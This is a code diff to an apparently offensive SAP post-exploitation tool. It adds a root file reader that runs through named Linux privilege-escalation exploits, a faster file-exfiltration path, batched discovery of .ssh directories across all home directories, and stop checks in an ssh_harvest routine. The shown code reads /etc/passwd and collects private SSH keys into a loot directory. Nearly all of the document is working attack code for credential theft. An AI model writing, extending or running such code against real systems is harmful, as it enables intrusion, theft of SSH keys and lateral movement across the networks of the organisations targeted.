@@ -103,8 +103,25 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
                     return ln
             return ""
 
+        def _read_file_full_root(path: str, max_size: int = 65536) -> bytes | None:
+            """Read entire file in one LPE invocation (vs 72-byte chunks)."""
+            code = (f"import base64,os;p='{path}';"
+                    f"s=os.path.getsize(p);"
+                    f"print(base64.b64encode(open(p,'rb').read()).decode()"
+                    f" if 0<s<={max_size} else '')")
+            out = _run_py_root(code)
+            for ln in out.splitlines():
+                ln = ln.strip()
+                if ln and _B64_LINE_RE.fullmatch(ln):
+                    try:
+                        return base64.b64decode(ln)
+                    except Exception:
+                        pass
+            return None
+
         _run_cmd_root._read_b64_chunk = _read_b64_chunk_root
         _run_cmd_root._run_py = _run_py_root
+        _run_cmd_root._read_file_full = _read_file_full_root
         label = ("Linux LPE → root ("
                  + (getattr(node, "linux_lpe_method", "") or "auto") + ")")
         return _run_cmd_root, label
@@ -250,6 +267,14 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
 
 def _exfil_file(run_cmd, path: str, max_size: int = 65536) -> bytes | None:
     """Read a remote file via chunked python3 base64 reads."""
+    # Fast path: single-shot read for root channel.  Each LPE
+    # invocation (Copy Fail / Dirty Frag) costs ~35s, so the 72-byte
+    # chunked path is unusable through root (25+ invocations for a
+    # 1.7KB /etc/passwd).  Single-shot reads the whole file in one go.
+    _read_full = getattr(run_cmd, "_read_file_full", None)
+    if _read_full:
+        return _read_full(path, max_size)
+
     # Get file size via python3 directly (no /bin/sh) — reliable
     # through SAPXPG on all kernel versions.
     _sz_code = f"print(__import__('os').path.getsize('{path}'))"
@@ -289,6 +314,14 @@ def _exfil_file(run_cmd, path: str, max_size: int = 65536) -> bytes | None:
 # Phase 1: SSH Harvest
 # ---------------------------------------------------------------------------
 
+def _is_stopped() -> bool:
+    try:
+        from sapmap_stop import is_stop_requested
+        return is_stop_requested()
+    except ImportError:
+        return False
+
+
 def ssh_harvest(node: SAPNode, state: SAPMAPState,
                 channel: str = "auto") -> dict:
     """Enumerate OS users, exfiltrate SSH keys, parse config/known_hosts.
@@ -316,11 +349,10 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         result["error"] = label
         return result
     result["channel"] = label
+    is_root = getattr(exec_fn, "_read_file_full", None) is not None
     print(f"[*] {sid}: ssh_harvest — channel: {label}")
 
     # ---- Step 1: enumerate OS users
-    # Primary: detect current user's home via python3 (always works —
-    # SAPXPG runs as <sid>adm, python3 os.path.expanduser is reliable).
     _run_py = exec_fn._run_py
     os_users = []
     home_dirs = {}
@@ -340,6 +372,10 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         home_dirs[cur_user] = cur_home
         os_users.append({"username": cur_user, "uid": "", "home": cur_home, "shell": ""})
         print(f"  [*] {sid}: current user = {cur_user}, home = {cur_home}")
+
+    if _is_stopped():
+        result["error"] = "stopped"
+        return result
 
     # 1b. Try /etc/passwd for additional users (may fail on hardened systems)
     passwd_raw = _exfil_file(exec_fn, "/etc/passwd", max_size=65536)
@@ -376,13 +412,14 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     print(f"[*] {sid}: ssh_harvest — {len(os_users)} users with "
           f"login shells")
 
+    if _is_stopped():
+        result["error"] = "stopped"
+        return result
+
     # ---- Step 2: discover SSH directories
-    # For each home dir, use a short python3 one-liner to list .ssh
-    # contents.  Must fit in SAPXPG PARAMS (255 bytes).
     homes_to_check = list(set(home_dirs.values()))
     if "/root" not in homes_to_check:
         homes_to_check.append("/root")
-    # SAP convention fallbacks
     sidadm_home = f"/home/{sidadm}"
     if sidadm_home not in homes_to_check:
         homes_to_check.append(sidadm_home)
@@ -390,37 +427,69 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
             home_dirs[sidadm] = sidadm_home
 
     ssh_dirs = {}
-    for home in homes_to_check:
-        ssh_path = f"{home}/.ssh"
-        # ~90 chars — well within 255-byte PARAMS limit
-        _ls_code = (
-            f"exec(\"import\\x20os\\n"
-            f"d='{ssh_path}'\\n"
-            f"if\\x20os.path.isdir(d):\\n"
-            f"\\x20[print(f)for\\x20f\\x20in\\x20os.listdir(d)]\\n"
-            f"\")"
+
+    if is_root:
+        # Root channel: combine ALL home dirs into one python3 call.
+        # Each LPE invocation costs ~15s, so one call for all dirs
+        # vs one-per-home saves minutes.
+        import json as _json
+        dirs_list = [f"{h}/.ssh" for h in homes_to_check]
+        dirs_json = _json.dumps(dirs_list)
+        _scan_code = (
+            f"import os,json;"
+            f"dirs={dirs_json};"
+            f"r={{}};"
+            f"[r.__setitem__(d,os.listdir(d)) "
+            f"for d in dirs if os.path.isdir(d)];"
+            f"print(json.dumps(r))"
         )
-        ls_out = exec_fn._run_py(_ls_code)
-        if not ls_out or not ls_out.strip():
-            continue
-        # Filter out Python tracebacks / error lines from SAPXPG
-        _err_prefixes = ("Traceback", "File ", "PermissionError",
-                         "OSError", "External program", "  ")
-        files = []
-        for fn in ls_out.splitlines():
-            fn = fn.strip()
-            if not fn:
+        scan_out = _run_py(_scan_code).strip()
+        for ln in scan_out.splitlines():
+            ln = ln.strip()
+            if ln.startswith("{"):
+                try:
+                    parsed = _json.loads(ln)
+                    for ssh_path, files in parsed.items():
+                        if files:
+                            ssh_dirs[ssh_path] = files
+                            print(f"  [*] {sid}: found .ssh at {ssh_path}: "
+                                  f"{', '.join(files)}")
+                except (ValueError, KeyError):
+                    pass
+                break
+    else:
+        # SAPXPG channel: one call per home (255-byte PARAMS limit).
+        for home in homes_to_check:
+            if _is_stopped():
+                break
+            ssh_path = f"{home}/.ssh"
+            _ls_code = (
+                f"exec(\"import\\x20os\\n"
+                f"d='{ssh_path}'\\n"
+                f"if\\x20os.path.isdir(d):\\n"
+                f"\\x20[print(f)for\\x20f\\x20in\\x20os.listdir(d)]\\n"
+                f"\")"
+            )
+            ls_out = exec_fn._run_py(_ls_code)
+            if not ls_out or not ls_out.strip():
                 continue
-            if any(fn.startswith(p) for p in _err_prefixes):
-                continue
-            files.append(fn)
-        if files:
-            ssh_dirs[ssh_path] = files
-            print(f"  [*] {sid}: found .ssh at {ssh_path}: "
-                  f"{', '.join(files)}")
-        elif "PermissionError" in ls_out or "Permission denied" in ls_out:
-            print(f"  [*] {sid}: .ssh at {ssh_path}: permission denied "
-                  f"(need root channel)")
+            _err_prefixes = ("Traceback", "File ", "PermissionError",
+                             "OSError", "External program", "  ")
+            files = []
+            for fn in ls_out.splitlines():
+                fn = fn.strip()
+                if not fn:
+                    continue
+                if any(fn.startswith(p) for p in _err_prefixes):
+                    continue
+                files.append(fn)
+            if files:
+                ssh_dirs[ssh_path] = files
+                print(f"  [*] {sid}: found .ssh at {ssh_path}: "
+                      f"{', '.join(files)}")
+            elif "PermissionError" in ls_out or "Permission denied" in ls_out:
+                print(f"  [*] {sid}: .ssh at {ssh_path}: permission denied "
+                      f"(need root channel)")
 
     print(f"[*] {sid}: ssh_harvest — {len(ssh_dirs)} .ssh directories")
 
@@ -437,6 +506,9 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     all_configs = []
 
     for ssh_dir, files in ssh_dirs.items():
+        if _is_stopped():
+            print(f"[!] {sid}: ssh_harvest — stopped by user")
+            break
         owner_home = os.path.dirname(ssh_dir)
         owner = None
         for uname, home in home_dirs.items():
@@ -450,6 +522,8 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         os.makedirs(owner_loot, exist_ok=True)
 
         for fname in files:
+            if _is_stopped():
+                break
             fpath = f"{ssh_dir}/{fname}"
 
             # Private keys
